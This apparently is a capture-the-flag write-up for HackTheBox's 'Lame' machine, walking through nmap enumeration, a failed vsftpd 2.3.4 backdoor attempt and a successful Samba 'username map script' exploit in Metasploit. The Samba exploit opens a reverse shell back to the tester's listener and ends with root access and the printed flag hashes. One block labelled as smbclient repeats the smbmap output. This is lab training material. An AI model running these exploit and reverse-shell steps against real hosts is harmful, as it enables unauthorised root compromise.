---
title: "CTF Writeup: HTB - Lame"
categories:
  - CTF
  - Writeup
---

In this write-up, we will explore how to tackle the Lame machine from HackTheBox. Lame is an easy-level machine that was released on 14th March 2017 and runs on Linux. Our objective is to exploit a vulnerability in the smb port to achieve direct root access. Follow along as we break down the process step-by-step.

## Enumeration

Run some port scans using `nmap`...

```bash
┌──(root㉿kali)-[/home/…/Desktop/HTB/Boxes/Lame]
└─# cat scans/alltcp
# Nmap 7.93 scan initiated Thu Mar  2 21:52:10 2023 as: nmap -sT -p- --min-rate 10000 -oN scans/alltcp -Pn lame.htb
Nmap scan report for lame.htb (10.10.10.3)
Host is up (0.034s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds

# Nmap done at Thu Mar  2 21:52:31 2023 -- 1 IP address (1 host up) scanned in 21.02 seconds
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/HTB/Boxes/Lame]
└─# cat scans/alludp 
# Nmap 7.93 scan initiated Thu Mar  2 21:52:31 2023 as: nmap -sU -p- --min-rate 10000 -oN scans/alludp lame.htb
Nmap scan report for lame.htb (10.10.10.3)
Host is up (0.071s latency).
Not shown: 65531 open|filtered udp ports (no-response)
PORT     STATE  SERVICE
22/udp   closed ssh
139/udp  closed netbios-ssn
445/udp  closed microsoft-ds
3632/udp closed distcc

# Nmap done at Thu Mar  2 21:52:44 2023 -- 1 IP address (1 host up) scanned in 13.57 seconds
```

```bash
┌──(root㉿kali)-[/home/…/Desktop/HTB/Boxes/Lame]
└─# cat scans/tcpscripts 
# Nmap 7.93 scan initiated Thu Mar  2 21:52:44 2023 as: nmap -p 21-22,139,445,3632 -sV -sC -oN scans/tcpscripts lame.htb
Nmap scan report for lame.htb (10.10.10.3)
Host is up (0.016s latency).

PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.13
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      vsFTPd 2.3.4 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
| ssh-hostkey: 
|   1024 600fcfe1c05f6a74d69024fac4d56ccd (DSA)
|_  2048 5656240f211ddea72bae61b1243de8f3 (RSA)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.20-Debian)
|   Computer name: lame
|   NetBIOS computer name: 
|   Domain name: hackthebox.gr
|   FQDN: lame.hackthebox.gr
|_  System time: 2023-03-02T21:52:33-05:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)
|_clock-skew: mean: 2h29m34s, deviation: 3h32m11s, median: -28s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Mar  2 21:53:36 2023 -- 1 IP address (1 host up) scanned in 52.00 seconds
```


Taking not of the above scan, we can see that the server has FTP open running `vsftpd 2.3.4`.

With FTP it's know to allow for anonymous logins, so wouldn't hurt to search for something 
usable to extrapolate this version.

```bash
┌──(root㉿kali)-[/home/…/Desktop/HTB/Boxes/Lame]
└─# msfconsole -q
msf6 > search vsftpd 2.3.4

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor

msf6 > 
```


Let's take note of that potential exploit and try it down the road.

Next we can take a look at Samba that's running, using smbmap to show the anonymous access limits.

```bash
┌──(root㉿kali)-[/home/…/Desktop/HTB/Boxes/Lame]
└─# smbmap -H lame.htb
[+] IP: lame.htb:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```


Now we can try to connect anonymously using `smbclient`.

```bash
┌──(root㉿kali)-[/home/…/Desktop/HTB/Boxes/Lame]
└─# smbmap -H lame.htb
[+] IP: lame.htb:445    Name: unknown                                           
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        tmp                                                     READ, WRITE     oh noes!
        opt                                                     NO ACCESS
        IPC$                                                    NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
        ADMIN$                                                  NO ACCESS       IPC Service (lame server (Samba 3.0.20-Debian))
```

I'll try to login anonymously and see if there's anything of interest since we have `/tmp` mapped to it.

```bash
smb: \> ls 
  .                                   D        0  Thu Mar  2 22:49:21 2023
  ..                                 DR        0  Sat Oct 31 03:33:58 2020
  .ICE-unix                          DH        0  Thu Mar  2 20:45:19 2023
  vmware-root                        DR        0  Thu Mar  2 20:45:47 2023
  .X11-unix                          DH        0  Thu Mar  2 20:45:43 2023
  .X0-lock                           HR       11  Thu Mar  2 20:45:43 2023
  5563.jsvc_up                        R        0  Thu Mar  2 20:46:19 2023
  vgauthsvclog.txt.0                  R     1600  Thu Mar  2 20:45:17 2023

                7282168 blocks of size 1024. 5386480 blocks available
smb: \> 

```

Nothin.



But we can search the version of Samba running on the box being `Samba 3.0.20`

```bash
┌──(root㉿kali)-[/home/…/Desktop/HTB/Boxes/Lame]
└─# searchsploit Samba 3.0.  
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Samba 3.0.10 (OSX) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                           | osx/remote/16875.rb
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                         | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                               | unix/remote/16320.rb
Samba 3.0.21 < 3.0.24 - LSA trans names Heap Overflow (Metasploit)                                             | linux/remote/9950.rb
Samba 3.0.24 (Linux) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                         | linux/remote/16859.rb
Samba 3.0.24 (Solaris) - 'lsa_io_trans_names' Heap Overflow (Metasploit)                                       | solaris/remote/16329.rb
Samba 3.0.27a - 'send_mailslot()' Remote Buffer Overflow                                                       | linux/dos/4732.c
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                              | multiple/dos/5712.pl
Samba 3.0.4 - SWAT Authorisation Buffer Overflow                                                               | linux/remote/364.pl
Samba < 3.0.20 - Remote Heap Overflow                                                                          | linux/remote/7701.txt
Samba < 3.6.2 (x86) - Denial of Service (PoC)                                                                  | linux_x86/dos/36741.py
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results

```


## Foothold

One that seems to pop out the most is the Username Map Script, so let's take a note on that.

So now that we have two viable attack vectors, we can go back to where we noted our `vsftpd` exploit and setup our exploit and playload.

```bash
┌──(root㉿kali)-[/home/…/Desktop/HTB/Boxes/Lame]
└─# msfconsole -q
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   21               yes       The target port (TCP)


Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts lame.htb
rhosts => lame.htb
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact 
payload => cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run

[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >                                                                                                                             

```

No luck.

But now we can proceed with the Samba exploit and see if we get any action.

```bash
┌──(root㉿kali)-[/home/…/Desktop/HTB/Boxes/Lame]
└─# msfconsole -q
msf6 > search Samba 3.0.20

Matching Modules
================

   #  Name                                Disclosure Date  Rank       Check  Description
   -  ----                                ---------------  ----       -----  -----------
   0  exploit/multi/samba/usermap_script  2007-05-14       excellent  No     Samba "username map script" Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/multi/samba/usermap_script

msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat
msf6 exploit(multi/samba/usermap_script) > 
msf6 exploit(multi/samba/usermap_script) > options

Module options (exploit/multi/samba/usermap_script):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   139              yes       The target port (TCP)


Payload options (cmd/unix/reverse_netcat):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.163    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(multi/samba/usermap_script) > set rhost lame.htb
rhost => lame.htb
msf6 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse
payload => cmd/unix/reverse
msf6 exploit(multi/samba/usermap_script) > set lhost tun0
lhost => 10.10.14.13
msf6 exploit(multi/samba/usermap_script) > set lport 555
lport => 555
msf6 exploit(multi/samba/usermap_script) > run

[*] Started reverse TCP double handler on 10.10.14.13:555 
[*] Accepted the first client connection...
[*] Accepted the second client connection...
[*] Command: echo udDGNvlrgm6H9CKO;
[*] Writing to socket A
[*] Writing to socket B
[*] Reading from sockets...
[*] Reading from socket B
[*] B: "udDGNvlrgm6H9CKO\r\n"
[*] Matching...
[*] A is input...
[*] Command shell session 1 opened (10.10.14.13:555 -> 10.10.10.3:57812) at 2023-03-02 23:11:55 -0500

```

Now that we've gotten a shell, we can inject a shell using Python `pty` package to call `bash`.

```bash
python -c 'import pty; pty.spawn("bash")'
root@lame:/#
```

Now that we have gained a shell as root, we can locate our flags, firstly the user key.

```bash
root@lame:/# find / -name 'user.txt' -exec cat {} \;
find / -name 'user.txt' -exec cat {} \;
1aa466aa8c03c80d12ea96a88980517d
```

Finally the root key...

```bash
root@lame:/# find / -name 'root.txt' -exec cat {} \;
find / -name 'root.txt' -exec cat {} \;
cde67e7033229c29ff8739ddf26cc641
```


## Conclusion

Lastly, **Hack the Planet**!